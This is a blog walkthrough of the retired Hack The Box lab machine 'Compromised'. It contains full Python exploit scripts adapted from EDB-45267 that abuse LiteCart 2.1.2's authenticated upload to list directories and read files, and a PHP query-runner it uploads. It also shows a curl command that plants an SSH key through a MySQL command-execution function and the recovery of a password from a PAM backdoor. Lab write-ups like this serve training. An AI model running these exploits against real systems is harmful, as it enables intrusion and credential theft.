---
layout: post  
title: "Compromised: Hack The Box Walkthrough"
date: 2021-01-24 22:46:17 +0000
last_modified_at: 2021-01-24 22:46:17 +0000
category: Walkthrough
tags: ["Hack The Box", Compromised, retired, Linux, Hard]
comments: true
protect: false
image:
  feature: compromised-htb-walkthrough.png
---

This post documents the complete walkthrough of Compromised, a retired vulnerable [VM][1] created by [D4nch3n][2], and hosted at [Hack The Box][3]. If you are uncomfortable with spoilers, please stop reading now.
{: .notice}

<!--more-->

## On this post
{:.no_toc}

* TOC
{:toc}

## Background

Compromised is a retired vulnerable VM from Hack The Box.

## Information Gathering

Let’s start with a `masscan` probe to establish the open ports in the host.

```
# masscan -e tun0 -p1-65535,U:1-65535 10.10.10.207 --rate=500

Starting masscan 1.0.5 (http://bit.ly/14GZzcT) at 2020-09-14 01:29:30 GMT
 -- forced options: -sS -Pn -n --randomize-hosts -v --send-eth
Initiating SYN Stealth Scan
Scanning 1 hosts [131070 ports/host]
Discovered open port 80/tcp on 10.10.10.207
Discovered open port 22/tcp on 10.10.10.207
```

No shit. Let's do one better with `nmap` scanning the discovered ports to establish their services.

```
# nmap -n -v -Pn -p22,80 -A --reason 10.10.10.207 -oN nmap.txt
...
PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 63 OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 6e:da:5c:8e:8e:fb:8e:75:27:4a:b9:2a:59:cd:4b:cb (RSA)
|   256 d5:c5:b3:0d:c8:b6:69:e4:fb:13:a3:81:4a:15:16:d2 (ECDSA)
|_  256 35:6a:ee:af:dc:f8:5e:67:0d:bb:f3:ab:18:64:47:90 (ED25519)
80/tcp open  http    syn-ack ttl 63 Apache httpd 2.4.29 ((Ubuntu))
|_http-favicon: Unknown favicon MD5: FD8AFB6FFE392F9ED98CC0B1B37B9A5D
| http-methods:
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.29 (Ubuntu)
| http-title: Legitimate Rubber Ducks | Online Store
|_Requested resource was http://10.10.10.207/shop/en/
```

Here's what the site looks like.

{% include image.html image_alt="5a110342.png" image_src="/93ee34f6-74ca-497c-9631-f0f65044a19b/5a110342.png" %}

### Directory/File Enumeration

Let's see what does `wfuzz` and SecLists give us.

```
# wfuzz -w /usr/share/seclists/Discovery/Web-Content/quickhits.txt -t 20 --hc '403,404' http://10.10.10.207/FUZZ
********************************************************
* Wfuzz 2.4.5 - The Web Fuzzer                         *
********************************************************

Target: http://10.10.10.207/FUZZ
Total requests: 2439

===================================================================
ID           Response   Lines    Word     Chars       Payload
===================================================================

000000722:   301        9 L      28 W     313 Ch      "/backup"
000000736:   200        16 L     59 W     941 Ch      "/backup/"

Total time: 7.983550
Processed Requests: 2439
Filtered Requests: 2437
Requests/sec.: 305.5031
```

What have we here?

{% include image.html image_alt="aa4352b4.png" image_src="/93ee34f6-74ca-497c-9631-f0f65044a19b/aa4352b4.png" %}

### Dangling Credentials

After extracting the archive file, we find a pretty interesting PHP comment in `shop/admin/login.php`.

```php
<?php
  require_once('../includes/app_header.inc.php');

  document::$template = settings::get('store_template_admin');
  document::$layout = 'login';

  if (!empty($_GET['redirect_url'])) {
    $redirect_url = (basename(parse_url($_REQUEST['redirect_url'], PHP_URL_PATH)) != basename(__FILE__)) ? $_REQUEST['redirect_url'] : document::link(WS_DIR_ADMIN);
  } else {
    $redirect_url = document::link(WS_DIR_ADMIN);
  }

  header('X-Robots-Tag: noindex');
  document::$snippets['head_tags']['noindex'] = '<meta name="robots" content="noindex" />';

  if (!empty(user::$data['id'])) notices::add('notice', language::translate('text_already_logged_in', 'You are already logged in'));

  if (isset($_POST['login'])) {
    //file_put_contents("./.log2301c9430d8593ae.txt", "User: " . $_POST['username'] . " Passwd: " . $_POST['password']);
    user::login($_POST['username'], $_POST['password'], $redirect_url, isset($_POST['remember_me']) ? $_POST['remember_me'] : false);
  }

  if (empty($_POST['username']) && !empty($_SERVER['PHP_AUTH_USER'])) $_POST['username'] = !empty($_SERVER['PHP_AUTH_USER']) ? $_SERVER['PHP_AUTH_USER'] : '';

  $page_login = new view();
  $page_login->snippets = array(
    'action' => $redirect_url,
  );
  echo $page_login->stitch('pages/login');

  require_once vmod::check(FS_DIR_HTTP_ROOT . WS_DIR_INCLUDES . 'app_footer.inc.php');
```

It seems to suggest the presence of `.log2301c9430d8593ae.txt`.

{% include image.html image_alt="4286a84b.png" image_src="/93ee34f6-74ca-497c-9631-f0f65044a19b/4286a84b.png" %}

Bingo!

### LiteCart 2.1.2 - Arbitrary File Upload

Armed with `admin`'s credentails (`admin:theNextGenSt0r3!~`), we can repurpose EDB-ID [45267](https://www.exploit-db.com/exploits/45267) to fit our needs. Long story short, I've used the exploit to run `phpinfo()` and things are not looking good because `disable_functions` blocked all the so-called dangerous functions needed for a reverse shell and even things like the Chankro `disable_functions` bypass.

{% include image.html image_alt="bff6da2f.png" image_src="/93ee34f6-74ca-497c-9631-f0f65044a19b/bff6da2f.png" %}

Fret not. We can still repurpose the exploit to list directories and read files.

<div class="filename"><span>dir.py</span></div>

```python
#!/usr/bin/env python
import mechanize
import cookielib
import urllib2
import requests
import sys
import argparse
import random
import string
parser = argparse.ArgumentParser(description='LiteCart')
parser.add_argument('-t',
                    help='admin login page url - EX: https://IPADDRESS/admin/')
parser.add_argument('-p',
                    help='admin password')
parser.add_argument('-u',
                    help='admin username')
parser.add_argument('-d',
                    help='directory to list')
args = parser.parse_args()
if(not args.u or not args.t or not args.p):
    pass #sys.exit("-h for help")
url = "http://compromised.htb/shop/admin/" # args.t
user = 'admin' # args.u
password = 'theNextGenSt0r3!~' # args.p
directory = args.d

br = mechanize.Browser()
cookiejar = cookielib.LWPCookieJar()
br.set_cookiejar( cookiejar )
br.set_handle_equiv( True )
br.set_handle_redirect( True )
br.set_handle_referer( True )
br.set_handle_robots( False )
br.addheaders = [ ( 'User-agent', 'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.1) Gecko/2008071615 Fedora/3.0.1-1.fc9 Firefox/3.0.1' ) ]
response = br.open(url)
br.select_form(name="login_form")
br["username"] = user
br["password"] = password
res = br.submit()
response = br.open(url + "?app=vqmods&doc=vqmods")
one=""
for form in br.forms():
    one= str(form).split("(")
    one= one[1].split("=")
    one= one[1].split(")")
    one = one[0]
cookies = br._ua_handlers['_cookies'].cookiejar
cookie_dict = {}
for c in cookies:
    cookie_dict[c.name] = c.value
rand = ''.join(random.choice(string.ascii_uppercase + string.digits) for _ in range(5))
files = {
        'vqmod': (rand + ".php", "<?php print_r(scandir('" + directory + "')); ?>", "application/xml"),
        'token':one,
        'upload':(None,"Upload")
    }
response = requests.post(url + "?app=vqmods&doc=vqmods", files=files, cookies=cookie_dict)
r = requests.get(url + "../vqmod/xml/" + rand + ".php?c=id")
if r.status_code == 200:
    #print "Shell => " + url + "../vqmod/xml/" + rand + ".php?c=id"
    print r.content
else:
    print "Sorry something went wrong"
```

Let's see if we can "list" `/home`.

{% include image.html image_alt="be375d2d.png" image_src="/93ee34f6-74ca-497c-9631-f0f65044a19b/be375d2d.png" %}

<div class="filename"><span>read.py</span></div>

```python
#!/usr/bin/env python
import mechanize
import cookielib
import urllib2
import requests
import sys
import argparse
import random
import string
parser = argparse.ArgumentParser(description='LiteCart')
parser.add_argument('-t',
                    help='admin login page url - EX: https://IPADDRESS/admin/')
parser.add_argument('-p',
                    help='admin password')
parser.add_argument('-u',
                    help='admin username')
parser.add_argument('-f',
                    help='file to read')
args = parser.parse_args()
if(not args.u or not args.t or not args.p):
    pass # sys.exit("-h for help")
url = "http://compromised.htb/shop/admin/" # args.t
user = 'admin' # args.u
password = 'theNextGenSt0r3!~' # args.p
filename = args.f

br = mechanize.Browser()
cookiejar = cookielib.LWPCookieJar()
br.set_cookiejar( cookiejar )
br.set_handle_equiv( True )
br.set_handle_redirect( True )
br.set_handle_referer( True )
br.set_handle_robots( False )
br.addheaders = [ ( 'User-agent', 'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.1) Gecko/2008071615 Fedora/3.0.1-1.fc9 Firefox/3.0.1' ) ]
response = br.open(url)
br.select_form(name="login_form")
br["username"] = user
br["password"] = password
res = br.submit()
response = br.open(url + "?app=vqmods&doc=vqmods")
one=""
for form in br.forms():
    one= str(form).split("(")
    one= one[1].split("=")
    one= one[1].split(")")
    one = one[0]
cookies = br._ua_handlers['_cookies'].cookiejar
cookie_dict = {}
for c in cookies:
    cookie_dict[c.name] = c.value
rand = ''.join(random.choice(string.ascii_uppercase + string.digits) for _ in range(5))
files = {
        'vqmod': (rand + ".php", "<?php echo file_get_contents('" + filename + "'); ?>", "application/xml"),
        'token':one,
        'upload':(None,"Upload")
    }
response = requests.post(url + "?app=vqmods&doc=vqmods", files=files, cookies=cookie_dict)
r = requests.get(url + "../vqmod/xml/" + rand + ".php?c=id")
if r.status_code == 200:
    #print "Shell => " + url + "../vqmod/xml/" + rand + ".php?c=id"
    print r.content
else:
    print "Sorry something went wrong"
```

Let's see if we can "read" `/etc/passwd`.

{% include image.html image_alt="3d664d34.png" image_src="/93ee34f6-74ca-497c-9631-f0f65044a19b/3d664d34.png" %}

Now this is interesting. The attacker left a note!

{% include image.html image_alt="be420bef.png" image_src="/93ee34f6-74ca-497c-9631-f0f65044a19b/be420bef.png" %}

### Backdoor

The user `red` is obviously a rabbit-hole. Why? There's no home directory and no shell. Something tells me that whoever left the note has also left a backdoor. On top of that, no outbound traffic other than traffic from SSH and HTTP, is allowed.

{% include image.html image_alt="96a89d94.png" image_src="/93ee34f6-74ca-497c-9631-f0f65044a19b/96a89d94.png" %}

Sadly, this means that we are not going to get a reverse shell, and SSH into `mysql`'s account must be the intended way to get a foothold onto the machine.

#### LiteCart Database Configuration

Since the next step has something to do with MySQL, we'd better get the credentials required to make a local connection to the MySQL server through PHP's `mysqli` extension.

{% include image.html image_alt="273a95a9.png" image_src="/93ee34f6-74ca-497c-9631-f0f65044a19b/273a95a9.png" %}

Armed with the credentials, we can once again repurpose the exploit to a MySQL client of sorts.

<div class="filename"><span>mysql.php</span></div>

```php
<?php
$mysqli = new mysqli("localhost", "root", "changethis", "ecom");

/* check connection */
if (mysqli_connect_errno()) {
    printf("Connect failed: %s\n", mysqli_connect_error());
    exit();
}

$query = $_GET[0]; # our SQL query

/* execute multi query */
if ($mysqli->multi_query($query)) {
    do {
        /* store first result set */
        if ($result = $mysqli->use_result()) {
            while ($row = $result->fetch_row()) {
                foreach ($row as $r)
                    printf("%s", (next($row) ? $r . ", " : $r));
                printf("\n");
            }
            $result->close();
        }
        /* print divider */
        if ($mysqli->more_results()) {
            printf("-----------------\n");
        }
    } while ($mysqli->next_result());
}

/* close connection */
$mysqli->close();
?>
```

And modify our exploit to read from `mysql.php`.

```python
files =
{
    'vqmod': (rand + ".php", open('mysql.php').read(), "application/xml"),
    'token':one,
    'upload':(None,"Upload")
}
```

Let's give it a shot.

{% include image.html image_alt="8a1d1bd3.png" image_src="/93ee34f6-74ca-497c-9631-f0f65044a19b/8a1d1bd3.png" %}

Looking good.

{% include image.html image_alt="9c2dd704.png" image_src="/93ee34f6-74ca-497c-9631-f0f65044a19b/9c2dd704.png" %}

Oh yeah!

## Foothold

Lo and behold, the attacker left something neat for us.

{% include image.html image_alt="8759d9e7.png" image_src="/93ee34f6-74ca-497c-9631-f0f65044a19b/8759d9e7.png" %}

If I had to guess, I would say that's a user-defined function for command execution! Armed with that, we can now inject a SSH-ED25519 keypair (it's short and sweet) we control to `/var/lib/mysql/.ssh/authorized_keys` like so.

```
# ssh-keygen -t ed25519 -f mysql
# curl -s \
       -G \
       --data-urlencode "0=select exec_cmd('echo $(cat mysql.pub) >> ~/.ssh/authorized_keys');" \
       http://compromised.htb/shop/vqmod/xml/7F35L.php
```

{% include image.html image_alt="a4c9f095.png" image_src="/93ee34f6-74ca-497c-9631-f0f65044a19b/a4c9f095.png" %}

Sweet.

### Getting `user.txt`

During enumeration of `mysql`'s account, I notice the presence of `strace-log.dat` in the home directory.

{% include image.html image_alt="a574b981.png" image_src="/93ee34f6-74ca-497c-9631-f0f65044a19b/a574b981.png" %}

Looks like someone has been using `strace` and saving the output to `strace-log.dat`. This struck me as odd so I took a look at it. And guess what I found.

{% include image.html image_alt="be9380dd.png" image_src="/93ee34f6-74ca-497c-9631-f0f65044a19b/be9380dd.png" %}

`3*NLJE32I$Fe` turns out to be `sysadmin`'s password. :laughing:

{% include image.html image_alt="5625dcae.png" image_src="/93ee34f6-74ca-497c-9631-f0f65044a19b/5625dcae.png" %}

Here's our flag.

{% include image.html image_alt="9f06c3bc.png" image_src="/93ee34f6-74ca-497c-9631-f0f65044a19b/9f06c3bc.png" %}

## Privilege Escalation

Remember what the note said? *"We are in everything you own."* This got me thinking. What if the attacker left a backdoor in PAM?

### Linux PAM backdoor

Googling for "linux backdoor pam" led me to this GitHub [repository](https://github.com/zephrax/linux-pam-backdoor) for a script that automates the creation of a backdoor for Linux-PAM (Pluggable Authentication Module).

This is what the script does, according to the file `backdoor.patch`.

{% include image.html image_alt="25c2e0b5.png" image_src="/93ee34f6-74ca-497c-9631-f0f65044a19b/25c2e0b5.png" %}

It bascially patches `pam_unix_auth.c` to compare the input Unix password (i.e. from `su` for example) to a hardcoded password indicated by the script and compiles `pam_unix.so`. This patch affects the `pam_sm_authenticate` function.

```c
pam_sm_authenticate(pam_handle_t *pamh, int flags, int argc, const char **argv)
{
    ...

	/* verify the password of this user */
	retval = _unix_verify_password(pamh, name, p, ctrl);
	name = p = NULL;

	AUTH_RETURN;
}
```

We can `locate` the file `pam_unix.so` like so.

{% include image.html image_alt="4d0bc9ef.png" image_src="/93ee34f6-74ca-497c-9631-f0f65044a19b/4d0bc9ef.png" %}

And see if it's patched with `objdump -D`.

{% include image.html image_alt="7d971c3a.png" image_src="/93ee34f6-74ca-497c-9631-f0f65044a19b/7d971c3a.png" %}

Indeed that's our backdoor in `pam_sm_authenticate()`. You can see the `strcmp` above and the hardcoded password in little-endian sequence. We can extract the password like so.

```
# echo -n 2d326d3238766e4533557e656b6c7a | xxd -p -r | rev; echo
zlke~U3Env82m2-
```

### Getting `root.txt`

Armed with the backdoor password, we can basically `su` to any account we want.

{% include image.html image_alt="f0e04fbb.png" image_src="/93ee34f6-74ca-497c-9631-f0f65044a19b/f0e04fbb.png" %}

Here's our flag.

{% include image.html image_alt="29e3700a.png" image_src="/93ee34f6-74ca-497c-9631-f0f65044a19b/29e3700a.png" %}

:dancer:

[1]: https://www.hackthebox.eu/home/machines/profile/276
[2]: https://www.hackthebox.eu/home/users/profile/103781
[3]: https://www.hackthebox.eu/
